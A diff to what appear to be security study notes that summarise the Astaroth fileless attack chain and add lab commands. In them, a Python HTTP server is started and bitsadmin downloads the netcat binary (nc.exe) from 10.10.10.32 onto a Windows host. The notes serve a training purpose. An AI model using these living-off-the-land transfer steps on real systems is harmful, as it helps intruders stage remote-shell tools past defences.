@@ -9,6 +9,17 @@ The blog post starts out talking about [fileless threats](https://www.microsoft.
 
 The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).
 
+Used Bitsadmin #Bitsadmin to transfer a file from my linux local host to a Windows remote host:
+
+```shell
+sudo python3 -m http.server
+```
+
+```PowerShell
+bitsadmin /transfer n http://10.10.10.32:8000/nc.exe C:\Temp\nc.exe
+```
+
+
 All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the attack.
 
 ![image](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)
